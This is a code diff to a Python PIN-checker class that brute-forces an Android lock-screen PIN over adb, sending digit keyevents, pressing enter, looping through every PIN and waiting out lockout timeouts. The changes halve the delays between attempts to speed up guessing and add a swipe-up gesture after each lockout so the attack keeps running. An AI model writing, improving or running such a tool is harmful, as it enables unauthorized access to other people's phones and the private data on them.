@@ -143,15 +143,33 @@ class PINChecker:
 
     def enter_pin(self, pin):
         try:
+            # Enter all digits faster
             for digit in pin:
                 keycode = str(int(digit) + 7)
                 run(['adb', 'shell', 'input', 'keyevent', keycode], check=True)
-                time.sleep(0.1)
+                time.sleep(0.05)  # Reduced from 0.1 to 0.05
             run(['adb', 'shell', 'input', 'keyevent', '66'], check=True)
-            time.sleep(0.5)
+            time.sleep(0.3)  # Reduced from 0.5 to 0.3
             return True
         except CalledProcessError as e:
             self.log(f"Error entering PIN: {e}", style="red")
+            return False
+
+    def swipe_up(self):
+        """Perform a quick swipe up gesture"""
+        try:
+            width, height = self.get_screen_size()
+            start_x = width // 2
+            start_y = int(height * 0.8)
+            end_x = width // 2
+            end_y = int(height * 0.2)
+            
+            run(['adb', 'shell', 'input', 'swipe', 
+                str(start_x), str(start_y), str(end_x), str(end_y), '50'], check=True)
+            time.sleep(0.5)
+            return True
+        except CalledProcessError as e:
+            self.log(f"Error during swipe: {e}", style="red")
             return False
 
     def check_if_unlocked(self):
@@ -218,6 +236,10 @@ class PINChecker:
             time.sleep(1)
         sys.stdout.write("\rResuming PIN attempts...                 \n")
         sys.stdout.flush()
+        
+        # Perform swipe up after timeout
+        self.log("Performing screen swipe...", style="blue")
+        self.swipe_up()
 
     def check_all_pins(self):
         if not self.check_device_connected():
@@ -257,7 +279,7 @@ class PINChecker:
                     
                     if not self.enter_pin(formatted_pin):
                         self.log(f"Failed to enter PIN: {formatted_pin}", style="red")
-                        time.sleep(1)
+                        time.sleep(0.5)  # Reduced from 1 to 0.5
                         continue
                     
                     current_attempt += 1
@@ -280,7 +302,7 @@ class PINChecker:
                         progress.start()
                     
                     progress.update(task, advance=1)
-                    time.sleep(0.1)  # Small delay between attempts
+                    time.sleep(0.05)  # Reduced from 0.1 to 0.05
             
             # Show final results
             elapsed_time = datetime.now() - self.start_time
